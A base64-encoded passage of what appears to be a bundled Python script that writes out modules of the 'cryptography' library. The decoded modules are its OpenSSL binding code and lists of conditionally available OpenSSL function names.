vbmU6XHJcbiAgICBpZiBub3Qgb2s6XHJcbiAgICAgICAgaWYgZXJyb3JzIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIGVycm9ycyA9IF9jb25zdW1lX2Vycm9ycyhsaWIpXHJcbiAgICAgICAgZXJyb3JzX3dpdGhfdGV4dCA9IF9lcnJvcnNfd2l0aF90ZXh0KGVycm9ycylcclxuXHJcbiAgICAgICAgcmFpc2UgSW50ZXJuYWxFcnJvcihcclxuICAgICAgICAgICAgIlVua25vd24gT3BlblNTTCBlcnJvci4gVGhpcyBlcnJvciBpcyBjb21tb25seSBlbmNvdW50ZXJlZCB3aGVuICJcclxuICAgICAgICAgICAgImFub3RoZXIgbGlicmFyeSBpcyBub3QgY2xlYW5pbmcgdXAgdGhlIE9wZW5TU0wgZXJyb3Igc3RhY2suIElmICJcclxuICAgICAgICAgICAgInlvdSBhcmUgdXNpbmcgY3J5cHRvZ3JhcGh5IHdpdGggYW5vdGhlciBsaWJyYXJ5IHRoYXQgdXNlcyAiXHJcbiAgICAgICAgICAgICJPcGVuU1NMIHRyeSBkaXNhYmxpbmcgaXQgYmVmb3JlIHJlcG9ydGluZyBhIGJ1Zy4gT3RoZXJ3aXNlICJcclxuICAgICAgICAgICAgInBsZWFzZSBmaWxlIGFuIGlzc3VlIGF0IGh0dHBzOi8vZ2l0aHViLmNvbS9weWNhL2NyeXB0b2dyYXBoeS8iXHJcbiAgICAgICAgICAgICJpc3N1ZXMgd2l0aCBpbmZvcm1hdGlvbiBvbiBob3cgdG8gcmVwcm9kdWNlICJcclxuICAgICAgICAgICAgInRoaXMuICh7MCFyfSkiLmZvcm1hdChlcnJvcnNfd2l0aF90ZXh0KSxcclxuICAgICAgICAgICAgZXJyb3JzX3dpdGhfdGV4dCxcclxuICAgICAgICApXHJcblxyXG5cclxuZGVmIGJ1aWxkX2NvbmRpdGlvbmFsX2xpYnJhcnkobGliLCBjb25kaXRpb25hbF9uYW1lcyk6XHJcbiAgICBjb25kaXRpb25hbF9saWIgPSB0eXBlcy5Nb2R1bGVUeXBlKCJsaWIiKVxyXG4gICAgY29uZGl0aW9uYWxfbGliLl9vcmlnaW5hbF9saWIgPSBsaWIgICMgdHlwZTogaWdub3JlW2F0dHItZGVmaW5lZF1cclxuICAgIGV4Y2x1ZGVkX25hbWVzID0gc2V0KClcclxuICAgIGZvciBjb25kaXRpb24sIG5hbWVzX2NiIGluIGNvbmRpdGlvbmFsX25hbWVzLml0ZW1zKCk6XHJcbiAgICAgICAgaWYgbm90IGdldGF0dHIobGliLCBjb25kaXRpb24pOlxyXG4gICAgICAgICAgICBleGNsdWRlZF9uYW1lcy51cGRhdGUobmFtZXNfY2IoKSlcclxuXHJcbiAgICBmb3IgYXR0ciBpbiBkaXIobGliKTpcclxuICAgICAgICBpZiBhdHRyIG5vdCBpbiBleGNsdWRlZF9uYW1lczpcclxuICAgICAgICAgICAgc2V0YXR0cihjb25kaXRpb25hbF9saWIsIGF0dHIsIGdldGF0dHIobGliLCBhdHRyKSlcclxuXHJcbiAgICByZXR1cm4gY29uZGl0aW9uYWxfbGliXHJcblxyXG5cclxuY2xhc3MgQmluZGluZzpcclxuICAgICIiIlxyXG4gICAgT3BlblNTTCBBUEkgd3JhcHBlci5cclxuICAgICIiIlxyXG5cclxuICAgIGxpYjogdHlwaW5nLkNsYXNzVmFyID0gTm9uZVxyXG4gICAgZmZpID0gZmZpXHJcbiAgICBfbGliX2xvYWRlZCA9IEZhbHNlXHJcbiAgICBfaW5pdF9sb2NrID0gdGhyZWFkaW5nLkxvY2soKVxyXG4gICAgX2xlZ2FjeV9wcm92aWRlcjogdHlwaW5nLkFueSA9IE5vbmVcclxuICAgIF9kZWZhdWx0X3Byb3ZpZGVyOiB0eXBpbmcuQW55ID0gTm9uZVxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhzZWxmKTpcclxuICAgICAgICBzZWxmLl9lbnN1cmVfZmZpX2luaXRpYWxpemVkKClcclxuXHJcbiAgICBkZWYgX2VuYWJsZV9maXBzKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgIyBUaGlzIGZ1bmN0aW9uIGVuYWJsZXMgRklQUyBtb2RlIGZvciBPcGVuU1NMIDMuMC4wIG9uIGluc3RhbGxzIHRoYXRcclxuICAgICAgICAjIGhhdmUgdGhlIEZJUFMgcHJvdmlkZXIgaW5zdGFsbGVkIHByb3Blcmx5LlxyXG4gICAgICAgIF9vcGVuc3NsX2Fzc2VydChzZWxmLmxpYiwgc2VsZi5saWIuQ1JZUFRPR1JBUEhZX09QRU5TU0xfMzAwX09SX0dSRUFURVIpXHJcbiAgICAgICAgc2VsZi5fYmFzZV9wcm92aWRlciA9IHNlbGYubGliLk9TU0xfUFJPVklERVJfbG9hZChcclxuICAgICAgICAgICAgc2VsZi5mZmkuTlVMTCwgYiJiYXNlIlxyXG4gICAgICAgIClcclxuICAgICAgICBfb3BlbnNzbF9hc3NlcnQoc2VsZi5saWIsIHNlbGYuX2Jhc2VfcHJvdmlkZXIgIT0gc2VsZi5mZmkuTlVMTClcclxuICAgICAgICBzZWxmLmxpYi5fZmlwc19wcm92aWRlciA9IHNlbGYubGliLk9TU0xfUFJPVklERVJfbG9hZChcclxuICAgICAgICAgICAgc2VsZi5mZmkuTlVMTCwgYiJmaXBzIlxyXG4gICAgICAgIClcclxuICAgICAgICBfb3BlbnNzbF9hc3NlcnQoc2VsZi5saWIsIHNlbGYubGliLl9maXBzX3Byb3ZpZGVyICE9IHNlbGYuZmZpLk5VTEwpXHJcblxyXG4gICAgICAgIHJlcyA9IHNlbGYubGliLkVWUF9kZWZhdWx0X3Byb3BlcnRpZXNfZW5hYmxlX2ZpcHMoc2VsZi5mZmkuTlVMTCwgMSlcclxuICAgICAgICBfb3BlbnNzbF9hc3NlcnQoc2VsZi5saWIsIHJlcyA9PSAxKVxyXG5cclxuICAgIEBjbGFzc21ldGhvZFxyXG4gICAgZGVmIF9yZWdpc3Rlcl9vc3JhbmRvbV9lbmdpbmUoY2xzKTpcclxuICAgICAgICAjIENsZWFyIGFueSBlcnJvcnMgZXh0YW50IGluIHRoZSBxdWV1ZSBiZWZvcmUgd2Ugc3RhcnQuIEluIG1hbnlcclxuICAgICAgICAjIHNjZW5hcmlvcyBvdGhlciB0aGluZ3MgbWF5IGJlIGludGVyYWN0aW5nIHdpdGggT3BlblNTTCBpbiB0aGUgc2FtZVxyXG4gICAgICAgICMgcHJvY2VzcyBzcGFjZSBhbmQgaXQgaGFzIHByb3ZlbiB1bnRlbmFibGUgdG8gYXNzdW1lIHRoYXQgdGhleSB3aWxsXHJcbiAgICAgICAgIyByZWxpYWJseSBjbGVhciB0aGUgZXJyb3IgcXVldWUuIE9uY2Ugd2UgY2xlYXIgaXQgaGVyZSB3ZSB3aWxsXHJcbiAgICAgICAgIyBlcnJvciBvbiBhbnkgc3Vic2VxdWVudCB1bmV4cGVjdGVkIGl0ZW0gaW4gdGhlIHN0YWNrLlxyXG4gICAgICAgIGNscy5saWIuRVJSX2NsZWFyX2Vycm9yKClcclxuICAgICAgICBpZiBjbHMubGliLkNSWVBUT0dSQVBIWV9ORUVEU19PU1JBTkRPTV9FTkdJTkU6XHJcbiAgICAgICAgICAgIHJlc3VsdCA9IGNscy5saWIuQ3J5cHRvZ3JhcGh5X2FkZF9vc3JhbmRvbV9lbmdpbmUoKVxyXG4gICAgICAgICAgICBfb3BlbnNzbF9hc3NlcnQoY2xzLmxpYiwgcmVzdWx0IGluICgxLCAyKSlcclxuXHJcbiAgICBAY2xhc3NtZXRob2RcclxuICAgIGRlZiBfZW5zdXJlX2ZmaV9pbml0aWFsaXplZChjbHMpOlxyXG4gICAgICAgIHdpdGggY2xzLl9pbml0X2xvY2s6XHJcbiAgICAgICAgICAgIGlmIG5vdCBjbHMuX2xpYl9sb2FkZWQ6XHJcbiAgICAgICAgICAgICAgICBjbHMubGliID0gYnVpbGRfY29uZGl0aW9uYWxfbGlicmFyeShsaWIsIENPTkRJVElPTkFMX05BTUVTKVxyXG4gICAgICAgICAgICAgICAgY2xzLl9saWJfbG9hZGVkID0gVHJ1ZVxyXG4gICAgICAgICAgICAgICAgY2xzLl9yZWdpc3Rlcl9vc3JhbmRvbV9lbmdpbmUoKVxyXG4gICAgICAgICAgICAgICAgIyBBcyBvZiBPcGVuU1NMIDMuMC4wIHdlIG11c3QgcmVnaXN0ZXIgYSBsZWdhY3kgY2lwaGVyIHByb3ZpZGVyXHJcbiAgICAgICAgICAgICAgICAjIHRvIGdldCBSQzIgKG5lZWRlZCBmb3IganVuayBhc3ltbWV0cmljIHByaXZhdGUga2V5XHJcbiAgICAgICAgICAgICAgICAjIHNlcmlhbGl6YXRpb24pLCBSQzQsIEJsb3dmaXNoLCBJREVBLCBTRUVELCBldGMuIFRoZXNlIHRoaW5nc1xyXG4gICAgICAgICAgICAgICAgIyBhcmUgdWdseSBsZWdhY3ksIGJ1dCB3ZSBhcmVuXCd0IGdvaW5nIHRvIGdldCByaWQgb2YgdGhlbVxyXG4gICAgICAgICAgICAgICAgIyBhbnkgdGltZSBzb29uLlxyXG4gICAgICAgICAgICAgICAgaWYgY2xzLmxpYi5DUllQVE9HUkFQSFlfT1BFTlNTTF8zMDBfT1JfR1JFQVRFUjpcclxuICAgICAgICAgICAgICAgICAgICBjbHMuX2xlZ2FjeV9wcm92aWRlciA9IGNscy5saWIuT1NTTF9QUk9WSURFUl9sb2FkKFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBjbHMuZmZpLk5VTEwsIGIibGVnYWN5IlxyXG4gICAgICAgICAgICAgICAgICAgIClcclxuICAgICAgICAgICAgICAgICAgICBfb3BlbnNzbF9hc3NlcnQoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGNscy5saWIsIGNscy5fbGVnYWN5X3Byb3ZpZGVyICE9IGNscy5mZmkuTlVMTFxyXG4gICAgICAgICAgICAgICAgICAgIClcclxuICAgICAgICAgICAgICAgICAgICBjbHMuX2RlZmF1bHRfcHJvdmlkZXIgPSBjbHMubGliLk9TU0xfUFJPVklERVJfbG9hZChcclxuICAgICAgICAgICAgICAgICAgICAgICAgY2xzLmZmaS5OVUxMLCBiImRlZmF1bHQiXHJcbiAgICAgICAgICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICAgICAgICAgIF9vcGVuc3NsX2Fzc2VydChcclxuICAgICAgICAgICAgICAgICAgICAgICAgY2xzLmxpYiwgY2xzLl9kZWZhdWx0X3Byb3ZpZGVyICE9IGNscy5mZmkuTlVMTFxyXG4gICAgICAgICAgICAgICAgICAgIClcclxuXHJcbiAgICBAY2xhc3NtZXRob2RcclxuICAgIGRlZiBpbml0X3N0YXRpY19sb2NrcyhjbHMpOlxyXG4gICAgICAgIGNscy5fZW5zdXJlX2ZmaV9pbml0aWFsaXplZCgpXHJcblxyXG5cclxuZGVmIF92ZXJpZnlfb3BlbnNzbF92ZXJzaW9uKGxpYik6XHJcbiAgICBpZiAoXHJcbiAgICAgICAgbGliLkNSWVBUT0dSQVBIWV9PUEVOU1NMX0xFU1NfVEhBTl8xMTFcclxuICAgICAgICBhbmQgbm90IGxpYi5DUllQVE9HUkFQSFlfSVNfTElCUkVTU0xcclxuICAgICAgICBhbmQgbm90IGxpYi5DUllQVE9HUkFQSFlfSVNfQk9SSU5HU1NMXHJcbiAgICApOlxyXG4gICAgICAgIHdhcm5pbmdzLndhcm4oXHJcbiAgICAgICAgICAgICJPcGVuU1NMIHZlcnNpb24gMS4xLjAgaXMgbm8gbG9uZ2VyIHN1cHBvcnRlZCBieSB0aGUgT3BlblNTTCAiXHJcbiAgICAgICAgICAgICJwcm9qZWN0LCBwbGVhc2UgdXBncmFkZS4gVGhlIG5leHQgcmVsZWFzZSBvZiBjcnlwdG9ncmFwaHkgd2lsbCAiXHJcbiAgICAgICAgICAgICJiZSB0aGUgbGFzdCB0byBzdXBwb3J0IGNvbXBpbGluZyB3aXRoIE9wZW5TU0wgMS4xLjAuIixcclxuICAgICAgICAgICAgdXRpbHMuRGVwcmVjYXRlZEluMzcsXHJcbiAgICAgICAgKVxyXG5cclxuXHJcbmRlZiBfdmVyaWZ5X3BhY2thZ2VfdmVyc2lvbih2ZXJzaW9uKTpcclxuICAgICMgT2NjYXNpb25hbGx5IHdlIHJ1biBpbnRvIHNpdHVhdGlvbnMgd2hlcmUgdGhlIHZlcnNpb24gb2YgdGhlIFB5dGhvblxyXG4gICAgIyBwYWNrYWdlIGRvZXMgbm90IG1hdGNoIHRoZSB2ZXJzaW9uIG9mIHRoZSBzaGFyZWQgb2JqZWN0IHRoYXQgaXMgbG9hZGVkLlxyXG4gICAgIyBUaGlzIG1heSBvY2N1ciBpbiBlbnZpcm9ubWVudHMgd2hlcmUgbXVsdGlwbGUgdmVyc2lvbnMgb2YgY3J5cHRvZ3JhcGh5XHJcbiAgICAjIGFyZSBpbnN0YWxsZWQgYW5kIGF2YWlsYWJsZSBpbiB0aGUgcHl0aG9uIHBhdGguIFRvIGF2b2lkIGVycm9ycyBjcm9wcGluZ1xyXG4gICAgIyB1cCBsYXRlciB0aGlzIGNvZGUgY2hlY2tzIHRoYXQgdGhlIGN1cnJlbnRseSBpbXBvcnRlZCBwYWNrYWdlIGFuZCB0aGVcclxuICAgICMgc2hhcmVkIG9iamVjdCB0aGF0IHdlcmUgbG9hZGVkIGhhdmUgdGhlIHNhbWUgdmVyc2lvbiBhbmQgcmFpc2UgYW5cclxuICAgICMgSW1wb3J0RXJyb3IgaWYgdGhleSBkbyBub3RcclxuICAgIHNvX3BhY2thZ2VfdmVyc2lvbiA9IGZmaS5zdHJpbmcobGliLkNSWVBUT0dSQVBIWV9QQUNLQUdFX1ZFUlNJT04pXHJcbiAgICBpZiB2ZXJzaW9uLmVuY29kZSgiYXNjaWkiKSAhPSBzb19wYWNrYWdlX3ZlcnNpb246XHJcbiAgICAgICAgcmFpc2UgSW1wb3J0RXJyb3IoXHJcbiAgICAgICAgICAgICJUaGUgdmVyc2lvbiBvZiBjcnlwdG9ncmFwaHkgZG9lcyBub3QgbWF0Y2ggdGhlIGxvYWRlZCAiXHJcbiAgICAgICAgICAgICJzaGFyZWQgb2JqZWN0LiBUaGlzIGNhbiBoYXBwZW4gaWYgeW91IGhhdmUgbXVsdGlwbGUgY29waWVzIG9mICJcclxuICAgICAgICAgICAgImNyeXB0b2dyYXBoeSBpbnN0YWxsZWQgaW4geW91ciBQeXRob24gcGF0aC4gUGxlYXNlIHRyeSBjcmVhdGluZyAiXHJcbiAgICAgICAgICAgICJhIG5ldyB2aXJ0dWFsIGVudmlyb25tZW50IHRvIHJlc29sdmUgdGhpcyBpc3N1ZS4gIlxyXG4gICAgICAgICAgICAiTG9hZGVkIHB5dGhvbiB2ZXJzaW9uOiB7fSwgc2hhcmVkIG9iamVjdCB2ZXJzaW9uOiB7fSIuZm9ybWF0KFxyXG4gICAgICAgICAgICAgICAgdmVyc2lvbiwgc29fcGFja2FnZV92ZXJzaW9uXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICApXHJcblxyXG5cclxuX3ZlcmlmeV9wYWNrYWdlX3ZlcnNpb24oY3J5cHRvZ3JhcGh5Ll9fdmVyc2lvbl9fKVxyXG5cclxuQmluZGluZy5pbml0X3N0YXRpY19sb2NrcygpXHJcblxyXG5fdmVyaWZ5X29wZW5zc2xfdmVyc2lvbihCaW5kaW5nLmxpYilcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2NyeXB0b2dyYXBoeS9oYXptYXQvYmluZGluZ3Mvb3BlbnNzbC9fY29uZGl0aW9uYWwucHknLCBiJyMgVGhpcyBmaWxlIGlzIGR1YWwgbGljZW5zZWQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBBcGFjaGUgTGljZW5zZSwgVmVyc2lvblxyXG4jIDIuMCwgYW5kIHRoZSBCU0QgTGljZW5zZS4gU2VlIHRoZSBMSUNFTlNFIGZpbGUgaW4gdGhlIHJvb3Qgb2YgdGhpcyByZXBvc2l0b3J5XHJcbiMgZm9yIGNvbXBsZXRlIGRldGFpbHMuXHJcblxyXG5pbXBvcnQgdHlwaW5nXHJcblxyXG5cclxuZGVmIGNyeXB0b2dyYXBoeV9oYXNfZWMybSgpIC0+IHR5cGluZy5MaXN0W3N0cl06XHJcbiAgICByZXR1cm4gW1xyXG4gICAgICAgICJFQ19QT0lOVF9nZXRfYWZmaW5lX2Nvb3JkaW5hdGVzX0dGMm0iLFxyXG4gICAgXVxyXG5cclxuXHJcbmRlZiBjcnlwdG9ncmFwaHlfaGFzX3NzbDNfbWV0aG9kKCkgLT4gdHlwaW5nLkxpc3Rbc3RyXTpcclxuICAgIHJldHVybiBbXHJcbiAgICAgICAgIlNTTHYzX21ldGhvZCIsXHJcbiAgICAgICAgIlNTTHYzX2NsaWVudF9tZXRob2QiLFxyXG4gICAgICAgICJTU0x2M19zZXJ2ZXJfbWV0aG9kIixcclxuICAgIF1cclxuXHJcblxyXG5kZWYgY3J5cHRvZ3JhcGh5X2hhc18xMTBfdmVyaWZpY2F0aW9uX3BhcmFtcygpIC0+IHR5cGluZy5MaXN0W3N0cl06XHJcbiAgICByZXR1cm4gWyJYNTA5X0NIRUNLX0ZMQUdfTkVWRVJfQ0hFQ0tfU1VCSkVDVCJdXHJcblxyXG5cclxuZGVmIGNyeXB0b2dyYXBoeV9oYXNfc2V0X2NlcnRfY2IoKSAtPiB0eXBpbmcuTGlzdFtzdHJdOlxyXG4gICAgcmV0dXJuIFtcclxuICAgICAgICAiU1NMX0NUWF9zZXRfY2VydF9jYiIsXHJcbiAgICAgICAgIlNTTF9zZXRfY2VydF9jYiIsXHJcbiAgICBdXHJcblxyXG5cclxuZGVmIGNyeXB0b2dyYXBoeV9oYXNfc3NsX3N0KCkgLT4gdHlwaW5nLkxpc3Rbc3RyXTpcclxuICAgIHJldHVybiBbXHJcbiAgICAgICAgIlNTTF9TVF9CRUZPUkUiLFxyXG4gICAgICAgICJTU0xfU1RfT0siLFxyXG4gICAgICAgICJTU0xfU1RfSU5JVCIsXHJcbiAgICAgICAgIlNTTF9TVF9SRU5FR09USUFURSIsXHJcbiAgICBdXHJcblxyXG5cclxuZGVmIGNyeXB0b2dyYXBoeV9oYXNfdGxzX3N0KCkgLT4gdHlwaW5nLkxpc3Rbc3RyXTpcclxuICAgIHJldHVybiBbXHJcbiAgICAgICAgIlRMU19TVF9CRUZPUkUiLFxyXG4gICAgICAgICJUTFNfU1RfT0siLFxyXG4gICAgXVxyXG5cclxuXHJcbmRlZiBjcnlwdG9ncmFwaHlfaGFzX3NjcnlwdCgpIC0+IHR5cGluZy5MaXN0W3N0cl06XHJcbiAgICByZXR1cm4gW1xyXG4gICAgICAgICJFVlBfUEJFX3NjcnlwdCIsXHJcbiAgICBdXHJcblxyXG5cclxuZGVmIGNyeXB0b2dyYXBoeV9oYXNfZXZwX3BrZXlfZGh4KCkgLT4gdHlwaW5nLkxpc3Rbc3RyXTpcclxuICAgIHJldHVybiBbXHJcbiAgICAgICAgIkVWUF9QS0VZX0RIWCIsXHJcbiAgICBdXHJcblxyXG5cclxuZGVmIGNyeXB0b2dyYXBoeV9oYXNfbWVtX2Z1bmN0aW9ucygpIC0+IHR5cGluZy5MaXN0W3N0cl06XHJcbiAgICByZXR1cm4gW1xyXG4gICAgICAgICJDcnlwdG9ncmFwaHlfQ1JZUFRPX3NldF9tZW1fZnVuY3Rpb25zIixcclxuICAgIF1cclxuXHJcblxyXG5kZWYgY3J5cHRvZ3JhcGh5X2hhc194NTA5X3N0b3JlX2N0eF9nZXRfaXNzdWVyKCkgLT4gdHlwaW5nLkxpc3Rbc3RyXTpcclxuICAgIHJldHVybiBbXHJcbiAgICAgICAgIlg1MDlfU1RPUkVfZ2V0X2dldF9pc3N1ZXIiLFxyXG4gICAgICAgICJYNTA5X1NUT1JFX3NldF9nZXRfaXNzdWVyIixcclxuICAgIF1cclxuXHJcblxyXG5kZWYgY3J5cHRvZ3JhcGh5X2hhc19lZDQ0OCgpIC0+IHR5cGluZy5MaXN0W3N0cl06XHJcbiAgICByZXR1cm4gW1xyXG4gICAgICAgICJFVlBfUEtFWV9FRDQ0OCIsXHJcbiAgICAgICAgIk5JRF9FRDQ0OCIsXHJcbiAgICBdXHJcblxyXG5cclxuZGVmIGNyeXB0b2dyYXBoeV9oYXNfZWQyNTUxOSgpIC0+IHR5cGluZy5MaXN0W3N0cl06XHJcbiAgICByZXR1cm4gW1xyXG4gICAgICAgICJOSURfRUQyNTUxOSIsXHJcbiAgICAgICAgIkVWUF9QS0VZX0VEMjU1MTkiLFxyXG4gICAgXVxyXG5cclxuXHJcbmRlZiBjcnlwdG9ncmFwaHlfaGFzX3BvbHkxMzA1KCkgLT4gdHlwaW5nLkxpc3Rbc3RyXTpcclxuICAgIHJldHVybiBbXHJcbiAgICAgICAgIk5JRF9wb2x5MTMwNSIsXHJcbiAgICAgICAgIkVWUF9QS0VZX1BPTFkxMzA1IixcclxuICAgIF1cclxuXHJcblxyXG5kZWYgY3J5cHRvZ3JhcGh5X2hhc19vbmVzaG90X2V2cF9kaWdlc3Rfc2lnbl92ZXJpZnkoKSAtPiB0eXBpbmcuTGlzdFtzdHJdOlxyXG4gICAgcmV0dXJuIFtcclxuICAgICAgICAiRVZQX0RpZ2VzdFNpZ24iLFxyXG4gICAgICAgICJFVlBfRGlnZXN0VmVyaWZ5IixcclxuICAgIF1cclxuXHJcblxyXG5kZWYgY3J5cHRvZ3JhcGh5X2hhc19ldnBfZGlnZXN0ZmluYWxfeG9mKCkgLT4gdHlwaW5nLkxpc3Rbc3RyXTpcclxuICAgIHJldHVybiBbXHJcbiAgICAgICAgIkVWUF9EaWdlc3RGaW5hbFhPRiIsXHJcbiAgICBdXHJcblxyXG5cclxuZGVmIGNyeXB0b2dyYXBoeV9oYXNfZXZwX3BrZXlfZ2V0X3NldF90bHNfZW5jb2RlZHBvaW50KCkgLT4gdHlwaW5nLkxpc3Rbc3RyXTpcclxuICAgIHJldHVybiBbXHJcbiAgICAgICAgIkVWUF9QS0VZX2dldDFfdGxzX2VuY29kZWRwb2ludCIsXHJcbiAgICAgICAgIkVWUF9QS0VZX3NldDFfdGxzX2VuY29kZWRwb2ludCIsXHJcbiAgICBdXHJcblxyXG5cclxuZGVmIGNyeXB0b2dyYXBoeV9oYXNfZmlwcygpIC0+IHR5cGluZy5MaXN0W3N0cl06XHJcbiAgICByZXR1cm4gW1xyXG4gICAgICAgICJGSVBTX21vZGVfc2V0IixcclxuICAgICAgICAiRklQU19tb2RlIixcclxuICAgIF1cclxuXHJcblxyXG5kZWYgY3J5cHRvZ3JhcGh5X2hhc19wc2soKSAtPiB0eXBpbmcuTGlzdFtzdHJdOlxyXG4gICAgcmV0dXJuIFtcclxuICAgICAgICAiU1NMX0NUWF91c2VfcHNrX2lkZW50aXR5X2hpbnQiLFxyXG4gICAgICAgICJTU0xfQ1RYX3NldF9wc2tfc2VydmVyX2NhbGxiYWNrIixcclxuICAgICAgICAiU1NMX0NUWF9zZXRfcHNrX2NsaWVudF9jYWxsYmFjayIsXHJcbiAgICBdXHJcblxyXG5cclxuZGVmIGNyeXB0b2dyYXBoeV9oYXNfcHNrX3Rsc3YxMygpIC0+IHR5cGluZy5MaXN0W3N0cl06XHJcbiAgICByZXR1cm4gW1xyXG4gICAgICAgICJTU0xfQ1RYX3NldF9wc2tfZmluZF9zZXNzaW9uX2NhbGxiYWNrIixcclxuICAgICAgICAiU1NMX0NUWF9zZXRfcHNrX3VzZV9zZXNzaW9uX2NhbGxiYWNrIixcclxuICAgICAgICAiQ3J5cHRvZ3JhcGh5X1NTTF9TRVNTSU9OX25ldyIsXHJcbiAgICAgICAgIlNTTF9DSVBIRVJfZmluZCIsXHJcbiAgICAgICAgIlNTTF9TRVNTSU9OX3NldDFfbWFzdGVyX2tleSIsXHJcbiAgICAgICAgIlNTTF9TRVNTSU9OX3NldF9jaXBoZXIiLFxyXG4gICAgICAgICJTU0xfU0VTU0lPTl9zZXRfcHJvdG9jb2xfdmVyc2lvbiIsXHJcbiAgICBdXHJcblxyXG5cclxuZGVmIGNyeXB0b2dyYXBoeV9oYXNfY3VzdG9tX2V4dCgpIC0+IHR5cGluZy5MaXN0W3N0cl06XHJcbiAgICByZXR1cm4gW1xyXG4gICAgICAgICJTU0xfQ1RYX2FkZF9jbGllbnRfY3VzdG9tX2V4dCIsXHJcbiAgICAgICAgIlNTTF9DVFhfYWRkX3NlcnZlcl9jdXN0b21fZXh0IixcclxuICAgICAgICAiU1NMX2V4dGVuc2lvbl9zdXBwb3J0ZWQiLFxyXG4gICAgXVxyXG5cclxuXHJcbmRlZiBjcnlwdG9ncmFwaHlfaGFzX29wZW5zc2xfY2xlYW51cCgpIC0+IHR5cGluZy5MaXN0W3N0cl06XHJcbiAgICByZXR1cm4gW1xyXG4gICAgICAgICJPUEVOU1NMX2NsZWFudXAiLFxyXG4gICAgXVxyXG5cclxuXHJcbmRlZiBjcnlwdG9ncmFwaHlfaGFzX3Rsc3YxMygpIC0+IHR5cGluZy5MaXN0W3N0cl06XHJcbiAgICByZXR1cm4gW1xyXG4gICAgICAgICJUTFMxXzNfVkVSU0lPTiIsXHJcbiAgICAgICAgIlNTTF9PUF9OT19UTFN2MV8zIixcclxuICAgIF1cclxuXHJcblxyXG5kZWYgY3J5cHRvZ3JhcGh5X2hhc190bHN2MTNfZnVuY3Rpb25zKCkgLT4gdHlwaW5nLkxpc3Rbc3RyXTpcclxuICAgIHJldHVybiBbXHJcbiAgICAgICAgIlNTTF9WRVJJRllfUE9TVF9IQU5EU0hBS0UiLFxyXG4gICAgICAgICJTU0xfQ1RYX3NldF9jaXBoZXJzdWl0ZXMiLFxyXG4gICAgICAgICJTU0xfdmVyaWZ5X2NsaWVudF9wb3N0X2hhbmRzaGFrZSIsXHJcbiAgICAgICAgIlNTTF9DVFhfc2V0X3Bvc3RfaGFuZHNoYWtlX2F1dGgiLFxyXG4gICAgICAgICJTU0xfc2V0X3Bvc3RfaGFuZHNoYWtlX2F1dGgiLFxyXG4gICAgICAgICJTU0xfU0VTU0lPTl9nZXRfbWF4X2Vhcmx5X2RhdGEiLFxyXG4gICAgICAgICJTU0xfd3JpdGVfZWFybHlfZGF0YSIsXHJcbiAgICAgICAgIlNTTF9yZWFkX2Vhcmx5X2RhdGEiLFxyXG4gICAgICAgICJTU0xfQ1RYX3NldF9tYXhfZWFybHlfZGF0YSIsXHJcbiAgICBdXHJcblxyXG5cclxuZGVmIGNyeXB0b2dyYXBoeV9oYXNfa2V5bG9nKCkgLT4gdHlwaW5nLkxpc3Rbc3RyXTpcclxuICAgIHJldHVybiBbXHJcbiAgICAgICAgIlNTTF9DVFhfc2V0X2tleWxvZ19jYWxsYmFjayIsXHJcbiAgICAgICAgIlNTTF9DVFhfZ2V0X2tleWxvZ19jYWxsYmFjayIsXHJcbiAgICBdXHJcblxyXG5cclxuZGVmIGNyeXB0b2dyYXBoeV9oYXNfcmF3X2tleSgpIC0+IHR5cGluZy5MaXN0W3N0cl06XHJcbiAgICByZXR1cm4gW1xyXG4gICAgICAgICJFVlBfUEtFWV9uZXdfcmF3X3ByaXZhdGVfa2V5IixcclxuICAgICAgICAiRVZQX1BLRVlfbmV3X3Jhd19wdWJsaWNfa2V5IixcclxuICAgICAgICAiRVZQX1BLRVlfZ2V0X3Jhd19wcml2YXRlX2tleSIsXHJcbiAgICAgICAgIkVWUF9QS0VZX2dldF9yYXdfcHVibGljX2tleSIsXHJcbiAgICBdXHJcblxyXG5cclxuZGVmIGNyeXB0b2dyYXBoeV9oYXNfZW5naW5lKCkgLT4gdHlwaW5nLkxpc3Rbc3RyXTpcclxuICAgIHJldHVybiBbXHJcbiAgICAgICAgIkVOR0lORV9ieV9pZCIsXHJcbiAgICAgICAgIkVOR0lORV9pbml0IixcclxuICAgICAgICAiRU5HSU5FX2ZpbmlzaCIsXHJcbiAgICAgICAgIkVOR0lORV9nZXRfZGVmYXVsdF9SQU5EIixcclxuICAgICAgICAiRU5HSU5FX3NldF9kZWZhdWx0X1JBTkQiLFxyXG4gICAgICAgICJFTkdJTkVfdW5yZWdpc3Rlcl9SQU5EIixcclxuICAgICAgICAiRU5HSU5FX2N0cmxfY21kIixcclxuICAgICAgICAiRU5HSU5FX2ZyZWUiLFxyXG4gICAgICAgICJFTkdJTkVfZ2V0X25hbWUiLFxyXG4gICAgICAgICJDcnlwdG9ncmFwaHlfYWRkX29zcmFuZG9tX2VuZ2luZSIsXHJcbiAgICAgICAgIkVOR0lORV9jdHJsX2NtZF9zdHJpbmciLFxyXG4gICAgICAgICJFTkdJTkVfbG9hZF9idWlsdGluX2VuZ2luZXMiLFxyXG4gICAgICAgICJFTkdJTkVfbG9hZF9wcml2YXRlX2tleSIsXHJcbiAgICAgICAgIkVOR0lORV9sb2FkX3B1YmxpY19rZXkiLFxyXG4gICAgICAgICJTU0xfQ1RYX3NldF9jbGllbnRfY2VydF9lbmdpbmUiLFxyXG4gICAgXVxyXG5cclxuXHJcbmRlZiBjcnlwdG9ncmFwaHlfaGFzX3ZlcmlmaWVkX2NoYWluKCkgLT4gdHlwaW5nLkxpc3Rbc3RyXTpcclxuICAgIHJldHVybiBbXHJcbiAgICAgICAgIlNTTF9nZXQwX3ZlcmlmaWVkX2NoYWluIixcclxuICAgIF1cclxuXHJcblxyXG5kZWYgY3J5cHRvZ3JhcGh5X2hhc19zcnRwKCkgLT4gdHlwaW5nLkxpc3Rbc3RyXTpcclxuICAgIHJldHVybiBbXHJcbiAgICAgICAgIlNTTF9DVFhfc2V0X3Rsc2V4dF91c2Vfc3J0cCIsXHJcbiAgICAgICAgI